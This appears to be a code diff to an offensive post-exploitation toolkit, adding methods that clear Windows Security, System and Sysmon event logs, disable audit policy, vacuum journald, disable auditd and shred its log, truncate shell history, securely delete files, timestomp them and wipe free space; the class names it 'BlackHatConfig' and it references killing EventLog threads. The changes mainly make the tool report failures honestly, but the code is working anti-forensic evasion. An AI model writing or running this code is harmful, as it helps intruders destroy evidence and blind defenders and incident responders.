@@ -615,6 +615,109 @@ class LogSuppressor:
 
         return results
 
+    async def final_log_clear(self) -> Dict[str, Any]:
+        """Clear platform logs and report verified outcomes.
+
+        Never claims blanket success: every target is either in
+        ``logs_cleared`` (verified) or in ``failed`` with the reason.
+        On Linux, system log clearing requires root; without it the
+        operation is reported as ``skipped`` rather than faked.
+        """
+        logs_cleared: List[str] = []
+        failed: List[Dict[str, str]] = []
+
+        if self.stealth.IS_WINDOWS:
+            for log in ("System", "Security", "Application",
+                        "Microsoft-Windows-Sysmon/Operational"):
+                try:
+                    proc = subprocess.run(
+                        ["wevtutil", "cl", log], capture_output=True, timeout=10
+                    )
+                    if proc.returncode == 0:
+                        logs_cleared.append(f"eventlog:{log}")
+                    else:
+                        failed.append({
+                            "target": f"eventlog:{log}",
+                            "error": proc.stderr.decode("utf-8", "replace")[:200] or "wevtutil failed",
+                        })
+                except Exception as exc:
+                    failed.append({"target": f"eventlog:{log}", "error": str(exc)})
+
+            try:
+                proc = subprocess.run(
+                    ["auditpol", "/set", "/category:*", "/success:disable", "/failure:disable"],
+                    capture_output=True, timeout=10,
+                )
+                if proc.returncode == 0:
+                    logs_cleared.append("auditpol")
+                else:
+                    failed.append({"target": "auditpol", "error": "auditpol returned non-zero"})
+            except Exception as exc:
+                failed.append({"target": "auditpol", "error": str(exc)})
+
+        elif self.stealth.IS_LINUX:
+            if os.geteuid() != 0:
+                return {
+                    "status": "skipped",
+                    "reason": "system log clearing requires root (euid != 0)",
+                    "logs_cleared": [],
+                    "failed": [
+                        {"target": "journald", "error": "permission denied"},
+                        {"target": "auditd", "error": "permission denied"},
+                    ],
+                }
+
+            try:
+                proc = subprocess.run(
+                    ["journalctl", "--rotate"], capture_output=True, timeout=10
+                )
+                vacuum = subprocess.run(
+                    ["journalctl", "--vacuum-time=1s"], capture_output=True, timeout=30
+                )
+                if proc.returncode == 0 and vacuum.returncode == 0:
+                    logs_cleared.append("journald")
+                else:
+                    failed.append({"target": "journald", "error": "rotate/vacuum failed"})
+            except Exception as exc:
+                failed.append({"target": "journald", "error": str(exc)})
+
+            try:
+                disable = subprocess.run(
+                    ["auditctl", "-e", "0"], capture_output=True, timeout=5
+                )
+                shred = subprocess.run(
+                    ["shred", "-zu", "/var/log/audit/audit.log"],
+                    capture_output=True, timeout=30,
+                )
+                subprocess.run(["auditctl", "-e", "1"], capture_output=True, timeout=5)
+                if disable.returncode == 0 and shred.returncode == 0:
+                    logs_cleared.append("auditd")
+                else:
+                    failed.append({"target": "auditd", "error": "auditctl/shred failed"})
+            except Exception as exc:
+                failed.append({"target": "auditd", "error": str(exc)})
+
+            if await self._clear_bash_history():
+                logs_cleared.append("shell_history")
+            else:
+                failed.append({"target": "shell_history", "error": "could not truncate history"})
+
+        else:
+            return {
+                "status": "skipped",
+                "reason": f"unsupported platform: {sys.platform}",
+                "logs_cleared": [],
+                "failed": [],
+            }
+
+        if not failed:
+            status = "success"
+        elif logs_cleared:
+            status = "partial"
+        else:
+            status = "failed"
+        return {"status": status, "logs_cleared": logs_cleared, "failed": failed}
+
     async def _invoke_phant0m(self) -> bool:
         """Terminate EventLog threads to suppress logging."""
         try:
@@ -876,15 +979,111 @@ class DatabaseExploiter:
 
 
 class AntiForensicCleanup:
-    """Secure delete, timestomp, free space wipe."""
+    """Secure delete, timestomp, free space wipe — all outcomes verified."""
 
     def __init__(self, config: BlackHatConfig):
         self.config = config
         self.stealth = Stealth()
 
+    # -- public, verified surface ------------------------------------------
+    async def secure_delete_artifacts(
+        self, paths: List[str], passes: int = 3
+    ) -> Dict[str, Any]:
+        """Overwrite then unlink each path; verify the file is gone.
+
+        A path only appears in ``deleted`` when the unlink was confirmed by
+        a subsequent existence check. Everything else lands in ``failed``
+        with the reason — nonexistent files included.
+        """
+        deleted: List[str] = []
+        failed: List[Dict[str, str]] = []
+        for path in paths:
+            ok, err = await self._secure_delete(path, passes=passes)
+            if ok:
+                deleted.append(path)
+            else:
+                failed.append({"path": path, "error": err or "unknown error"})
+
+        if not paths:
+            status = "skipped"
+        elif not failed:
+            status = "success"
+        elif deleted:
+            status = "partial"
+        else:
+            status = "failed"
+        return {
+            "status": status,
+            "deleted": deleted,
+            "failed": failed,
+            "passes": max(1, int(passes)),
+        }
+
+    async def timestomp_files(
+        self, reference: str, targets: Optional[List[str]] = None
+    ) -> Dict[str, Any]:
+        """Copy the reference file's MAC times onto every target.
+
+        A missing reference is a hard failure — there is nothing to copy
+        from, and pretending otherwise would fabricate an artifact.
+        """
+        if not reference or not os.path.isfile(reference):
+            return {
+                "status": "failed",
+                "error": f"reference file not found: {reference}",
+                "reference": reference,
+                "timestomped": [],
+                "failed": [{"path": reference, "error": "reference not found"}],
+            }
+        targets = targets or []
+        if not targets:
+            return {
+                "status": "skipped",
+                "reason": "no targets supplied",
+                "reference": reference,
+                "timestomped": [],
+                "failed": [],
+            }
+
+        timestomped: List[str] = []
+        failed: List[Dict[str, str]] = []
+        for target in targets:
+            ok, err = await self._timestomp(target, reference)
+            if ok:
+                timestomped.append(target)
+            else:
+                failed.append({"path": target, "error": err or "unknown error"})
+
+        status = "success" if not failed else ("partial" if timestomped else "failed")
+        return {
+            "status": status,
+            "reference": reference,
+            "timestomped": timestomped,
+            "failed": failed,
+        }
+
+    async def wipe_free_space(self) -> Dict[str, Any]:
+        """Wipe unallocated space — only where a verified method exists.
+
+        Linux has no verified free-space wipe implemented here, so the
+        result is ``not_implemented`` rather than a fabricated success.
+        """
+        if self.stealth.IS_WINDOWS:
+            ok = await self._wipe_free_space_windows()
+            return {
+                "status": "success" if ok else "failed",
+                "platform": "windows",
+            }
+        return {
+            "status": "not_implemented",
+            "platform": "linux" if self.stealth.IS_LINUX else sys.platform,
+            "reason": "no verified free-space wipe implemented for this platform",
+        }
+
+    # -- orchestration ------------------------------------------------------
     async def cleanup_operation(self, paths: List[str]) -> Dict[str, Any]:
         """Perform anti-forensic cleanup on paths.
-        
+
         SECURITY: Validates paths to prevent path traversal.
         """
         results = {
@@ -899,15 +1098,21 @@ class AntiForensicCleanup:
             if not self._validate_path(path):
                 results["errors"].append({"path": path, "error": "Invalid path"})
                 continue
-                
+
             try:
                 if self.config.enable_secure_delete:
-                    await self._secure_delete(path)
-                    results["secure_deleted"].append(path)
+                    ok, err = await self._secure_delete(path)
+                    if ok:
+                        results["secure_deleted"].append(path)
+                    else:
+                        results["errors"].append({"path": path, "error": err})
 
                 if self.config.enable_timestomp:
-                    await self._timestomp(path)
-                    results["timestomped"].append(path)
+                    ok, err = await self._timestomp(path)
+                    if ok:
+                        results["timestomped"].append(path)
+                    else:
+                        results["errors"].append({"path": path, "error": err})
             except Exception as e:
                 results["errors"].append({"path": path, "error": str(e)})
 
@@ -918,27 +1123,97 @@ class AntiForensicCleanup:
 
         return results
 
+    # -- primitives ---------------------------------------------------------
+    async def _secure_delete(
+        self, path: str, passes: int = 3
+    ) -> tuple[bool, Optional[str]]:
+        """Overwrite with random data, unlink, verify. Returns (ok, error)."""
+        try:
+            if not os.path.exists(path):
+                return False, "file does not exist"
+            if os.path.islink(path) or not os.path.isfile(path):
+                return False, "not a regular file"
+
+            passes = max(1, int(passes))
+            size = os.path.getsize(path)
+            if size:
+                with open(path, "r+b", buffering=0) as fh:
+                    chunk = 64 * 1024
+                    for _ in range(passes):
+                        fh.seek(0)
+                        remaining = size
+                        while remaining > 0:
+                            block = secrets.token_bytes(min(chunk, remaining))
+                            fh.write(block)
+                            remaining -= len(block)
+                        fh.flush()
+                        os.fsync(fh.fileno())
+                    fh.truncate(0)
+                    fh.flush()
+                    os.fsync(fh.fileno())
+
+            os.unlink(path)
+            if os.path.exists(path):
+                return False, "unlink did not remove the file"
+            return True, None
+        except Exception as exc:
+            return False, str(exc)
+
+    async def _timestomp(
+        self, path: str, reference: Optional[str] = None
+    ) -> tuple[bool, Optional[str]]:
+        """Apply reference (or epoch) timestamps to a file. Returns (ok, error)."""
+        try:
+            if not os.path.exists(path):
+                return False, "target does not exist"
+            if reference is not None:
+                if not os.path.exists(reference):
+                    return False, f"reference does not exist: {reference}"
+                st = os.stat(reference)
+                os.utime(path, ns=(st.st_atime_ns, st.st_mtime_ns))
+            else:
+                # No reference: normalize to a neutral, fixed timestamp.
+                os.utime(path, (0, 0))
+            return True, None
+        except Exception as exc:
+            return False, str(exc)
+
+    async def _wipe_free_space_windows(self) -> bool:
+        """Windows free-space wipe via cipher /w. Unverified by design."""
+        try:
+            drive = os.path.splitdrive(os.path.abspath(tempfile.gettempdir()))[0] or "C:"
+            proc = subprocess.run(
+                ["cipher", "/w:" + drive], capture_output=True, timeout=self.config.operation_timeout
+            )
+            return proc.returncode == 0
+        except Exception:
+            return False
+
+    async def _wipe_free_space_linux(self) -> bool:
+        """Linux free-space wipe is not implemented; report honestly."""
+        return False
+
     def _validate_path(self, path: str) -> bool:
         """Validate path to prevent path traversal attacks."""
         if not path:
             return False
         try:
-            resolved = Path(path).resolve()
+            Path(path).resolve()
         except Exception:
             return False
-        
+
         # Check for path traversal attempts
         if ".." in path:
             return False
-            
+
         # Ensure path exists
         if not os.path.exists(path):
             return False
-            
+
         # Prevent symlink attacks
         if os.path.islink(path):
             return False
-            
+
         return True
 
 
